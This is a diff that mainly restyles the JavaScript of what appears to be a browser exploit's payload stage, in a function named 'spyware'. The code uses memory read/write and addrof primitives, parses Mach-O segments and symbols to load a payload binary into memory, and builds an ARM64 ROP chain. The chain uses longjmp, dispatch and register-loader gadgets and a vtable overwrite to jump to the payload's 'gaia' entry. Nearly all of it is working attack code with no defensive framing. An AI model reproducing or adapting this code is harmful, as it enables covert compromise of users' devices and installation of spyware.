@@ -1,81 +1,81 @@
-function fsyms(mem, base, want)
-{
+
+const LC_SYMTAB     = 0x2
+const LC_SEGMENT_64 = 0x19
+
+function fsyms(mem, base, want) {
     var stab = null;
     var ncmds = mem.u32(Add(base, 0x10));
-    for(var i = 0, off = 0x20; i < ncmds; ++i)
+
+    for (var i = 0, off = 0x20; i < ncmds; ++i)
     {
         var cmd = mem.u32(Add(base, off));
-        if(cmd == 0x2) // LC_SYMTAB
-        {
-            stab =
-            {
+        if (cmd == LC_SYMTAB) {
+            stab = {
                 symoff:  mem.u32(Add(base, off +  0x8)),
                 nsyms:   mem.u32(Add(base, off +  0xc)),
                 stroff:  mem.u32(Add(base, off + 0x10)),
                 strsize: mem.u32(Add(base, off + 0x14)),
             };
+
             break;
         }
+
         off += mem.u32(Add(base, off + 0x4));
     }
-    if(stab == null)
-    {
+
+    if (stab == null) {
         fail("stab");
     }
+
     var strs = mem.read(Add(base, stab.stroff), stab.strsize);
     var syms = {};
-    for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
-    {
+    
+    for (var i = 0; i < stab.nsyms && want.length > 0; ++i) {
         var strx = mem.u32(Add(base, stab.symoff + i * 0x10));
-        for(var j = 0; j < want.length; ++j)
-        {
+        
+        for (var j = 0; j < want.length; ++j) {
             var s = want[j];
             var match = true;
-            for(var k = 0; k < s.length; ++k)
-            {
-                if(strs[strx + k] != s.charCodeAt(k))
-                {
+
+            for (var k = 0; k < s.length; ++k) {
+                if (strs[strx + k] != s.charCodeAt(k)) {
                     match = false;
                     break;
                 }
             }
-            if(match && strs[strx + s.length] == 0)
-            {
+
+            if (match && strs[strx + s.length] == 0) {
                 syms[s] = mem.readInt64(Add(base, stab.symoff + i * 0x10 + 0x8));
                 want.splice(j, 1);
                 break;
             }
         }
     }
+
     return syms;
 }
 
-function _u32(i)
-{
+function _u32(i) {
     var b = this.read(i, 4);
     return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
 }
 
-function _read(i, l)
-{
-    if(i instanceof Int64) i = i.lo();
-    if(l instanceof Int64) l = l.lo();
+function _read(i, l) {
+    if (i instanceof Int64) i = i.lo();
+    if (l instanceof Int64) l = l.lo();
     return this.slice(i, i + l);
 }
 
-function _readInt64(addr)
-{
+function _readInt64(addr) {
     return new Int64(this.read(addr, 8));
 }
 
-function _writeInt64(i, val)
-{
-    if(i instanceof Int64) i = i.lo();
+function _writeInt64(i, val) {
+    if (i instanceof Int64) i = i.lo();
     this.set(val.bytes(), i);
 }
 
-function spyware(stage1, memory, binary)
-{
+function spyware(stage1, memory, binary) {
     var wrapper = document.createElement('div')
     var wrapper_addr = stage1.addrof(wrapper)
 
@@ -84,41 +84,43 @@ function spyware(stage1, memory, binary)
 
     memory.u32 = _u32;
 
+    // <insert -spyware- ROP gadgets here>
+
     // regloader:
-    // 0x180ee6048      e00317aa       mov x0, x23
-    // 0x180ee604c      e10316aa       mov x1, x22
-    // 0x180ee6050      e20318aa       mov x2, x24
-    // 0x180ee6054      e30319aa       mov x3, x25
-    // 0x180ee6058      e4031aaa       mov x4, x26
-    // 0x180ee605c      e5031baa       mov x5, x27
-    // 0x180ee6060      80033fd6       blr x28
+    // e00317aa       mov x0, x23
+    // e10316aa       mov x1, x22
+    // e20318aa       mov x2, x24
+    // e30319aa       mov x3, x25
+    // e4031aaa       mov x4, x26
+    // e5031baa       mov x5, x27
+    // 80033fd6       blr x28
 
     // dispatch:
-    // 0x180d62e48      a0023fd6       blr x21
-    // 0x180d62e4c      fd7b43a9       ldp x29, x30, [sp, 0x30]
-    // 0x180d62e50      f44f42a9       ldp x20, x19, [sp, 0x20]
-    // 0x180d62e54      f65741a9       ldp x22, x21, [sp, 0x10]
-    // 0x180d62e58      ff030191       add sp, sp, 0x40
-    // 0x180d62e5c      c0035fd6       ret
+    // a0023fd6       blr x21
+    // fd7b43a9       ldp x29, x30, [sp, 0x30]
+    // f44f42a9       ldp x20, x19, [sp, 0x20]
+    // f65741a9       ldp x22, x21, [sp, 0x10]
+    // ff030191       add sp, sp, 0x40
+    // c0035fd6       ret
 
-    // stackloader
-    // 0x19331cfe0      fd7b46a9       ldp x29, x30, [sp, 0x60]
-    // 0x19331cfe4      f44f45a9       ldp x20, x19, [sp, 0x50]
-    // 0x19331cfe8      f65744a9       ldp x22, x21, [sp, 0x40]
-    // 0x19331cfec      f85f43a9       ldp x24, x23, [sp, 0x30]
-    // 0x19331cff0      fa6742a9       ldp x26, x25, [sp, 0x20]
-    // 0x19331cff4      fc6f41a9       ldp x28, x27, [sp, 0x10]
-    // 0x19331cff8      ffc30191       add sp, sp, 0x70
-    // 0x19331cffc      c0035fd6       ret
+    // stackloader:
+    // fd7b46a9       ldp x29, x30, [sp, 0x60]
+    // f44f45a9       ldp x20, x19, [sp, 0x50]
+    // f65744a9       ldp x22, x21, [sp, 0x40]
+    // f85f43a9       ldp x24, x23, [sp, 0x30]
+    // fa6742a9       ldp x26, x25, [sp, 0x20]
+    // fc6f41a9       ldp x28, x27, [sp, 0x10]
+    // ffc30191       add sp, sp, 0x70
+    // c0035fd6       ret
 
     // __longjmp:
-    // 0x180700ad4      135040a9       ldp x19, x20, [x0]
-    // 0x180700ad8      155841a9       ldp x21, x22, [x0, 0x10]
-    // 0x180700adc      176042a9       ldp x23, x24, [x0, 0x20]
-    // 0x180700ae0      196843a9       ldp x25, x26, [x0, 0x30]
-    // 0x180700ae4      1b7044a9       ldp x27, x28, [x0, 0x40]
-    // 0x180700ae8      1d7845a9       ldp x29, x30, [x0, 0x50]
-    // 0x180700aec      1d0846a9       ldp x29, x2, [x0, 0x60]
+    // 135040a9       ldp x19, x20, [x0]
+    // 155841a9       ldp x21, x22, [x0, 0x10]
+    // 176042a9       ldp x23, x24, [x0, 0x20]
+    // 196843a9       ldp x25, x26, [x0, 0x30]
+    // 1b7044a9       ldp x27, x28, [x0, 0x40]
+    // 1d7845a9       ldp x29, x30, [x0, 0x50]
+    // 1d0846a9       ldp x29, x2, [x0, 0x60]
 
     /*var slide               = Sub(memory.readInt64(vtab), 0x186d68698); // some ptr in WebCore (PrivateFrameworks one)
     var dlsym               = Add(0x18084ef90, slide);
@@ -146,65 +148,76 @@ function spyware(stage1, memory, binary)
     binary.read = _read;
     binary.readInt64 = _readInt64;
     binary.writeInt64 = _writeInt64;
+    
     var pstart = new Int64('0xffffffffffffffff');
     var pend   = new Int64(0);
     var ncmds  = binary.u32(0x10);
-    for(var i = 0, off = 0x20; i < ncmds; ++i)
-    {
+
+    for (var i = 0, off = 0x20; i < ncmds; ++i) {
         var cmd = binary.u32(off);
-        if(cmd == 0x19) // LC_SEGMENT_64
+        if(cmd == LC_SEGMENT_64) // LC_SEGMENT_64
         {
             var filesize = binary.readInt64(off + 0x30);
             if(!(filesize.hi() == 0 && filesize.lo() == 0))
             {
                 var vmstart = binary.readInt64(off + 0x18);
                 var vmend = Add(vmstart, binary.readInt64(off + 0x20));
-                if(vmstart.hi() < pstart.hi() || (vmstart.hi() == pstart.hi() && vmstart.lo() < pstart.lo()))
-                {
+                if (vmstart.hi() < pstart.hi() || 
+                    (vmstart.hi() == pstart.hi() && 
+                     vmstart.lo() < pstart.lo())) {
                     pstart = vmstart;
                 }
-                if(vmend.hi() > pend.hi() || (vmend.hi() == pend.hi() && vmend.lo() > pend.lo()))
-                {
+
+                if (vmend.hi() > pend.hi() || 
+                    (vmend.hi() == pend.hi() && 
+                     vmend.lo() > pend.lo())) {
                     pend = vmend;
                 }
             }
         }
+
         off += binary.u32(off + 0x4);
     }
+
     var shsz = Sub(pend, pstart);
-    if(shsz.hi() != 0)
-    {
+
+    if(shsz.hi() != 0) {
         fail("shsz");
     }
+
     var payload = new Uint8Array(shsz.lo());
     var paddr = memory.readInt64(Add(stage1.addrof(payload), 0x10));
     var codeAddr = Sub(memPoolEnd, shsz);
     codeAddr = Sub(codeAddr, codeAddr.lo() & 0x3fff);
     var shslide = Sub(codeAddr, pstart);
+    
     var off = 0x20;
-    for(var i = 0; i < ncmds; ++i)
-    {
+
+    for (var i = 0; i < ncmds; ++i) {
         var cmd = binary.u32(off);
-        if(cmd == 0x19) // LC_SEGMENT_64
+        if(cmd == LC_SEGMENT_64) // LC_SEGMENT_64
         {
             var filesize = binary.readInt64(off + 0x30);
-            if(!(filesize.hi() == 0 && filesize.lo() == 0))
+            if(!(filesize.hi() == 0 && 
+                 filesize.lo() == 0))
             {
                 var vmaddr   = binary.readInt64(off + 0x18);
                 var vmsize   = binary.readInt64(off + 0x20);
                 var fileoff  = binary.readInt64(off + 0x28);
-                if(vmsize.hi() < filesize.hi() || (vmsize.hi() == filesize.hi() && vmsize.lo() < filesize.lo()))
-                {
+                if (vmsize.hi() < filesize.hi() || 
+                    (vmsize.hi() == filesize.hi() && 
+                     vmsize.lo() < filesize.lo())) {
                     filesize = vmsize;
                 }
-                if(fileoff.hi() != 0)
-                {
+                
+                if (fileoff.hi() != 0) {
                     fail("fileoff");
                 }
-                if(filesize.hi() != 0)
-                {
+                
+                if (filesize.hi() != 0) {
                     fail("filesize");
                 }
+
                 fileoff = fileoff.lo();
                 filesize = filesize.lo();
                 payload.set(binary.slice(fileoff, fileoff + filesize), Sub(vmaddr, pstart).lo());
@@ -212,6 +225,7 @@ function spyware(stage1, memory, binary)
                 // TODO: remove writeInt64
             }
         }
+
         off += binary.u32(off + 0x4);
     }
     //payload.set(binary.slice(0x20, off), 0x20); XXX
@@ -220,11 +234,14 @@ function spyware(stage1, memory, binary)
     payload.read = _read;
     payload.readInt64 = _readInt64;
     var psyms = fsyms(payload, 0, ["gaia"]);
-    if(psyms.gaia == null)
-    {
+    
+    if (psyms.gaia == null) {
         fail("gaia");
     }
+
     var jmpAddr = Add(psyms.gaia, shslide);
+
+    // ROP : BEGIN ! 
 
     memory.writeInt64(Add(vtab, 0x18), longjmp);
     memory.writeInt64(Add(el_addr, 0x58), dispatch);        // x30 (gadget)
@@ -236,6 +253,7 @@ function spyware(stage1, memory, binary)
     var stack = memory.readInt64(Add(stage1.addrof(arr), 0x10));
 
     var pos = arrsz - off;
+
     // after dispatch:
     arr[pos++] = 0xdead0000;                // unused
     arr[pos++] = 0xdead0001;                // unused
@@ -282,9 +300,8 @@ function spyware(stage1, memory, binary)
     arr[pos++] = 0xdead001c;                // x29 (unused)
     arr[pos++] = 0xdead001d;                // x29 (unused)
     // Need to skip the first instruction (4 bytes) of regloader because we already have x0
-    var tmp = Add(regloader, 4);
-    arr[pos++] = tmp.lo();                  // x30 (gadget)
-    arr[pos++] = tmp.hi();                  // x30 (gadget)
+    arr[pos++] = Add(regloader, 0x4).lo();  // x30 (gadget)
+    arr[pos++] = Add(regloader, 0x4).hi();  // x30 (gadget)
 
     // after dispatch:
     arr[pos++] = 0xdead0020;                // unused
@@ -367,8 +384,8 @@ function spyware(stage1, memory, binary)
     arr[pos++] = 0xdead0059;                // x25 == x3 (unused)
     arr[pos++] = 0xdead005a;                // x24 == x2 (unused)
     arr[pos++] = 0xdead005b;                // x24 == x2 (unused)
-    arr[pos++] = 1;                         // x23 == x0 (seconds)
-    arr[pos++] = 0;                         // x23 == x0 (seconds)
+    arr[pos++] = 0x00000001;                // x23 == x0 (seconds)
+    arr[pos++] = 0x00000000;                // x23 == x0 (seconds)
     arr[pos++] = 0xdead005c;                // x22 == x1 (unused)
     arr[pos++] = 0xdead005d;                // x22 == x1 (unused)
     arr[pos++] = sleep.lo();                // x21 (func)
@@ -401,8 +418,7 @@ function spyware(stage1, memory, binary)
     arr[pos++] = jmpAddr.hi();              // x30 (payload)
 
     // dummy
-    for(var i = 0; i < 0x20; ++i)
-    {
+    for (var i = 0; i < 0x20; ++i) {
         arr[pos++] = 0xdeadc0de;
     }
 
